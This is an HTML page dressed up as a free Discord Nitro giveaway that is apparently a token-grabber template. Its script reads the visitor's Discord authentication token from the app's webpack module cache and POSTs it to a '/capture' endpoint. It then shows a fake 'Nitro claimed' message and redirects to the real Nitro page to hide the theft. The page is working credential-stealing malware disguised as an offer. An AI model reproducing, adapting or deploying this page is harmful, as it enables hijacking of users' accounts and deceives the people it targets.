<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord Nitro</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1e1f22;font-family:'gg sans',Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:#2b2d31;border-radius:16px;width:500px;padding:40px;text-align:center}
.nitro{font-size:60px;margin-bottom:20px}
h1{color:#fff;margin-bottom:10px}
p{color:#b5bac1;margin-bottom:20px}
button{background:#5865f2;color:#fff;padding:14px 28px;border:none;border-radius:40px;font-size:18px;font-weight:600;cursor:pointer}
.status{margin-top:20px;color:#23a55a;display:none}
</style>
</head>
<body>
<div class="container">
<div class="nitro">🎮</div>
<h1>FREE DISCORD NITRO</h1>
<p>3 months free! Limited time offer!</p>
<button onclick="grabToken()">Claim Nitro</button>
<div id="status" class="status"></div>
</div>
<script>
async function grabToken(){
document.getElementById('status').style.display='block';
document.getElementById('status').innerHTML='Generating...';
let token=null;
try{
if(window.webpackChunkdiscord_app){
const m=window.webpackChunkdiscord_app.push([[],{},function(e){return e}]);
for(const id in m.c){
const mod=m.c[id];
if(mod?.exports?.default?.getToken){
token=mod.exports.default.getToken();
break;
}
}
}
if(token){
await fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:'[[TOKEN]]',data:{discordToken:token}})});
document.getElementById('status').innerHTML='✅ Nitro claimed! Check DMs!';
}else{
document.getElementById('status').innerHTML='❌ Login to Discord first!';
}
}catch(e){document.getElementById('status').innerHTML='❌ Login to Discord first!';}
setTimeout(()=>{window.location.href='https://discord.com/nitro'},2000);
}
</script>
</body>
</html>
